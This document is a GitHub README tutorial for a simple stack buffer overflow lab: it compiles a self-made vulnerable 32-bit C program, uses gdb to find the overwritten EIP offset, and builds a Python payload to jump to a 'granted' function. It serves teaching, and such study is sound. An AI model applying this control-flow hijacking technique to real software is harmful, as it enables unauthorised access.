# buffer_overflow_simulation
*An article and instruction to perform simple stack overflow vulnerability exploit (For Educational Purposes Only).*

I am going to demonstrate simple buffer overflow attack by using free source like google cloud console.
# STAGE 1 : Preparation
- Open https://console.cloud.google.com/
 ![Google Cloud Console](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20162739.png)
- Sign In using google account.
- Activate cloud shell and use root access :
  ```
  sudo su
  ```
  ![Cloud Shell](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20215016.png)
- Install build-essential, gcc-multilib, and gdb.
  ```
  apt install build-essential gcc-multilib gdb -y
  ```
- Create a simple program using C language with name app.c.  *file attached in this repository, copy + paste it*.
  ```
  nano app.c
  ```
- Compile C program using 32 bit to simplify our simulation by using this command.
  ```
  gcc -g -m32 -no-pie -o app app.c
  ```
- Make a input file name attack.txt.  *file attached in this repository, copy + paste it*.
  ```
  nano attack.txt
  ```
- Test the program by using attack.txt.
  ```
  ./app < attack.txt
  ```
  ![App Testing](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20172856.png?raw=true)
# STAGE 2 : Debugging
- Debug application using gdb.
  ```
  gdb -q app
  ```
- Use command list 1,20 to list source code from line 1 to 20.
  ```
   list 1,20
  ```
- Pause the process at line 9 to analyze memory after string is being input with command.
  ```
  break 9
  ```
- run application, it will reach break point 1 (line 9).
  ```
  run < attack.txt
  ```
  ![Break point](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20173427.png?raw=true)
- Get detail information about stack memory.
  ```
  info reg
  ```
  ![Info Reg](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20175330.png?raw=true)
- The most important information here is ESP and EIP register.
- The register ‘ESP’ is used to point to the next item on the stack and is referred to as the ‘stack pointer’.
- EIP is a register in x86 architectures (32bit). It holds the "Extended Instruction Pointer" for the stack. In other words, it tells the computer where to go next to execute the next command and controls the flow of a program.
- Open table of stack memory, Our mission is to find where EIP located in this memory table.
  ```
  x/12x $esp
  ```
  ![Stack Memory](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20175556.png?raw=true)
- By knowing the location of EIP, we can determine where to put our payload to take control next execution command.
- Now we test by changing the input from AAAA to AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ
- Close gdb
  ```
  quit
  ```
- Use this command to change the input.
  ```
  bash -c "echo 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ' > attack.txt"
  ```
- Debug application to inspect the memory.
  ```
  gdb -q app
  ```
- Set break point to 9.
  ```
  break 9
  ```
- Run application and set input from attack.txt.
  ```
  run < attack.txt
  ```
- When it reaches break point. Dissassable the function to find memory address of granted function.
  ```
  disas main
  ```
- Then open stack memory.
  ```
  x/12x $esp
  ```
- Continue the process.
  ```
  continue
  ```
  ![EIP](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20212616.png)
# STAGE 3 : Finding
- The result shows segmentation fault error it return the value of 0x47474646 which is the next execution command. It failed to execute because it doesn't link to any process.
- We already know that EIP store value of the next execution command. Which mean 0x47474646 is the value of EIP.
- From the memory table we can find the position of EIP is on 4rd column and second row.
- Because we use alphabet character we can easily conclude that 46 and 47 are F and G respectively.
- Therefore the payload should be placed on FFGG
# STAGE 4 : Creating Payload
- We create the payload using python  and  put memory address of granted function in EIP variable. *file attached in this repository, copy + paste it*.
  ```
  nano payload
  ```
- Memory address of granted function is stored in little-endian fashion, the least significant bytes can stay where they are and new digits are added to the right at a higher address.
- Put the payload into file attack.txt
  ```
  python3 payload > attack.txt
   ```
  ![Payload](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20172704.png?raw=true)
- Attack the application using attack.txt.
   ```
  ./app < attack.txt
   ```
- Now we are successfully gain the access by using Buffer Overflow Vulnerability.
  ![Granted](https://github.com/JFeo390w9tgf/buffer_overflow_simulation/blob/main/img/Screenshot%202024-03-13%20172739.png?raw=true)

USE IT WISELY !!!
============
- coded by -> ig : [@bukanperetasjahat](https://instagram.com/bukanperetasjahat/)
